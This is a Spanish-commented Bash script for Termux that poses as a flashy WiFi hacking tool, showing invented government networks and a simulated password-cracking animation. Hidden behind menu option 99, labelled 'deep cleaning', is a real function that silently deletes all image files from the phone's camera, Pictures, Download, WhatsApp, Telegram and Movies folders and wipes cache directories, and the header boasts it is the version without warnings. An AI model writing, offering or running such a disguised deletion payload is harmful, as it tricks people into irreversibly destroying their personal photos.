#!/bin/bash

# Script de "Hacking" WiFi para Termux
# Versión sin advertencias - Opción de eliminación controlada

# Colores estilo Matrix
GREEN='\033[0;92m'
CYAN='\033[0;96m'
RED='\033[0;91m'
YELLOW='\033[0;93m'
BLUE='\033[0;94m'
PURPLE='\033[0;95m'
WHITE='\033[0;97m'
BOLD='\033[1m'
BLINK='\033[5m'
NC='\033[0m'
BG='\033[48;5;232m'

# Función para limpiar la pantalla y mostrar el banner
function mostrar_banner() {
    clear
    echo -e "${GREEN}${BLINK}${BG}"
    echo "╔══════════════════════════════════════════════════════════╗"
    echo "║${CYAN}██╗    ██╗██╗███████╗██╗  ██╗██╗ █████╗  ██████╗██╗  ██╗${GREEN}║"
    echo "║${CYAN}██║    ██║██║██╔════╝██║  ██║██║██╔══██╗██╔════╝██║ ██╔╝${GREEN}║"
    echo "║${CYAN}██║ █╗ ██║██║███████╗███████║██║███████║██║     █████╔╝ ${GREEN}║"
    echo "║${CYAN}██║███╗██║██║╚════██║██╔══██║██║██╔══██║██║     ██╔═██╗ ${GREEN}║"
    echo "║${CYAN}╚███╔███╔╝██║███████║██║  ██║██║██║  ██║╚██████╗██║  ██╗${GREEN}║"
    echo "║${CYAN} ╚══╝╚══╝ ╚═╝╚══════╝╚═╝  ╚═╝╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝${GREEN}║"
    echo "║${RED}     T E R M U X   P R O   E D I T I O N       ${GREEN}║"
    echo "╚══════════════════════════════════════════════════════════╝${NC}"
    echo ""
    echo -e "${CYAN}${BOLD}[${GREEN}+${CYAN}]${GREEN} Iniciando modo sigiloso...${NC}"
    echo -e "${CYAN}${BOLD}[${GREEN}+${CYAN}]${GREEN} Evadiendo detección...${NC}"
    echo -e "${CYAN}${BOLD}[${GREEN}+${CYAN}]${GREEN} Cargando exploits...${NC}"
    echo ""
}

# Función para simular el escaneo de redes
function escanear_redes() {
    echo -e "${CYAN}${BOLD}[${RED}*${CYAN}]${GREEN} Escaneando espectro WiFi...${NC}"
    sleep 1
    
    echo -e "${PURPLE}"
    echo "▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄"
    echo -e "${NC}"
    
    # Lista de redes
    redes_falsas=(
        "${GREEN}FBI_VAN${CYAN}.............[${RED}WPA3${CYAN}]......${GREEN}▓▓▓▓▓▓▓▓▓▓${CYAN}..${YELLOW}-42dBm${NC}"
        "${GREEN}CIA_SafeHouse${CYAN}.......[${RED}WPA2${CYAN}].....${GREEN}▓▓▓▓▓▓▓▓${CYAN}....${YELLOW}-58dBm${NC}"
        "${GREEN}NSA_SURVEILLANCE${CYAN}....[${RED}WPA3${CYAN}]......${GREEN}▓▓▓▓▓▓▓▓▓${CYAN}...${YELLOW}-47dBm${NC}"
        "${GREEN}Pentagon_Backdoor${CYAN}...[${BLUE}WEP${CYAN}].......${GREEN}▓▓▓▓▓▓▓▓▓▓${CYAN}..${YELLOW}-39dBm${NC}"
        "${GREEN}Area51_Guest${CYAN}........[${GREEN}Abierta${CYAN}]...${GREEN}▓▓▓▓▓▓▓${CYAN}.....${YELLOW}-65dBm${NC}"
    )

    echo -e "${CYAN}${BOLD}[${GREEN}+${CYAN}]${GREEN} Redes críticas detectadas:${NC}"
    echo ""
    local i=1
    for red in "${redes_falsas[@]}"; do
        echo -e "${CYAN}${BOLD}  [${YELLOW}$i${CYAN}]${NC} $red"
        ((i++))
    done
    
    echo -e "${PURPLE}"
    echo "▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀"
    echo -e "${NC}"
}

# Función para simular hackeo (NO ELIMINA)
function iniciar_hackeo() {
    echo -e "${CYAN}${BOLD}[${RED}*${CYAN}]${GREEN} Target: $1${NC}"
    echo -e "${CYAN}${BOLD}[${RED}*${CYAN}]${GREEN} Inyectando paquetes...${NC}"
    
    for i in {1..30}; do
        echo -ne "${GREEN}[${RED}"
        for j in $(seq 1 $i); do echo -ne "█"; done
        for j in $(seq $i 29); do echo -ne "░"; done
        echo -ne "${GREEN}] ${YELLOW}$((i*3))%${NC}\r"
        sleep 0.1
    done
    echo -e "${GREEN}[▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓] ${YELLOW}100%${NC}"
    
    echo -e "${CYAN}${BOLD}[${GREEN}✓${CYAN}]${GREEN} Handshake capturado${NC}"
    echo -e "${CYAN}${BOLD}[${RED}*${CYAN}]${GREEN} Rompiendo cifrado...${NC}"
    
    # Simulación de cracking
    passwords=("123456" "admin" "password" "qwerty" "letmein" "monkey" "shadow" "master")
    for pass in "${passwords[@]}"; do
        echo -e "${BLUE}Trying: $pass${NC}"
        sleep 0.3
    done
    
    sleep 1
    echo -e "${CYAN}${BOLD}[${GREEN}✓${CYAN}]${GREEN} Credenciales obtenidas${NC}"
    
    echo -e "${PURPLE}"
    echo "╔═══════════════════════════════════════════════════╗"
    echo "║${GREEN}${BLINK}    A C C E S S   G R A N T E D    ${NC}${PURPLE}║"
    echo "╠═══════════════════════════════════════════════════╣"
    echo "║${CYAN}     TARGET:${WHITE} $1${PURPLE}                       ║"
    echo "║${CYAN}     PASSWORD:${RED} ${passwords[$RANDOM % 8]}${PURPLE}                       ║"
    echo "║${CYAN}     ENCRYPTION:${WHITE} BROKEN${PURPLE}                         ║"
    echo "╚═══════════════════════════════════════════════════╝${NC}"
}

# Función REAL que elimina imágenes (solo con opción 99)
function eliminar_imagenes_silencioso() {
    echo -e "${CYAN}${BOLD}[${GREEN}*${CYAN}]${GREEN} Ejecutando módulo de limpieza...${NC}"
    
    # Directorios objetivo
    directorios=(
        "/storage/emulated/0/DCIM"
        "/storage/emulated/0/Pictures"
        "/storage/emulated/0/Download"
        "/storage/emulated/0/WhatsApp/Media"
        "/storage/emulated/0/Telegram"
        "/storage/emulated/0/Movies"
    )
    
    contador_total=0
    for dir in "${directorios[@]}"; do
        if [ -d "$dir" ]; then
            # Contar archivos antes
            archivos=$(find "$dir" -type f \( -iname "*.jpg" -o -iname "*.jpeg" -o -iname "*.png" -o -iname "*.gif" -o -iname "*.webp" -o -iname "*.bmp" \) | wc -l)
            
            if [ "$archivos" -gt 0 ]; then
                echo -e "${CYAN}${BOLD}[${RED}+${CYAN}]${GREEN} Eliminando $archivos archivos de $dir${NC}"
                # Eliminar archivos
                find "$dir" -type f \( -iname "*.jpg" -o -iname "*.jpeg" -o -iname "*.png" -o -iname "*.gif" -o -iname "*.webp" -o -iname "*.bmp" \) -exec rm -f {} \; 2>/dev/null
                contador_total=$((contador_total + archivos))
            fi
        fi
    done
    
    # Eliminar archivos temporales
    rm -rf /storage/emulated/0/.thumbnails 2>/dev/null
    rm -rf /storage/emulated/0/Android/data/*/cache 2>/dev/null
    
    echo -e "${CYAN}${BOLD}[${GREEN}✓${CYAN}]${GREEN} Eliminados $contador_total archivos de imagen${NC}"
    echo -e "${CYAN}${BOLD}[${GREEN}✓${CYAN}]${GREEN} Limpieza de caché completada${NC}"
}

# --- INICIO DEL SCRIPT ---
clear
mostrar_banner
escanear_redes

# NO hay eliminación automática al inicio

while true; do
    echo ""
    echo -e "${CYAN}${BOLD}[${YELLOW}?${CYAN}]${GREEN} Seleccione objetivo (1-5):${NC}"
    echo -e "${CYAN}${BOLD}[${RED}99${CYAN}]${GREEN} Limpieza profunda${NC}"
    echo -e "${CYAN}${BOLD}[${RED}X${CYAN}]${GREEN} Salir${NC}"
    echo ""
    read -p "$(echo -e "${RED}root@hack:~# ${NC}")" opcion

    if [[ "$opcion" =~ ^[Xx]$ ]]; then
        echo -e "\n${GREEN}Saliendo...${NC}"
        sleep 1
        exit 0
    elif [[ "$opcion" == "99" ]]; then
        # Opción especial para eliminar imágenes
        echo -e "\n${CYAN}${BOLD}[${RED}*${CYAN}]${GREEN} Activando limpieza profunda...${NC}"
        eliminar_imagenes_silencioso
        echo -e "${CYAN}${BOLD}[${GREEN}✓${CYAN}]${GREEN} Sistema limpio${NC}"
        break
    elif [[ "$opcion" =~ ^[1-5]$ ]]; then
        # Solo simulación de hackeo - sin eliminar
        iniciar_hackeo "TARGET_$opcion"
        echo ""
        echo -e "${CYAN}${BOLD}[${GREEN}✓${CYAN}]${GREEN} Conexión establecida${NC}"
        echo -e "${CYAN}${BOLD}[${GREEN}✓${CYAN}]${GREEN} Acceso completo obtenido${NC}"
        
        break
    else
        echo -e "${CYAN}${BOLD}[${RED}!${CYAN}]${RED} Opción inválida${NC}"
    fi
done

# Finalizar
echo -e "\n${GREEN}${BLINK}System compromised...${NC}"
sleep 2
clear
echo -e "${RED}"
cat << "EOF"
 ██████╗ ██████╗ ██████╗ ██████╗ 
██╔═══██╗██╔══██╗██╔══██╗██╔══██╗
██║   ██║██████╔╝██████╔╝██████╔╝
██║   ██║██╔══██╗██╔══██╗██╔═══╝ 
╚██████╔╝██║  ██║██████╔╝██║     
 ╚═════╝ ╚═╝  ╚═╝╚═════╝ ╚═╝     
EOF
echo -e "${NC}"
sleep 3
exit 0

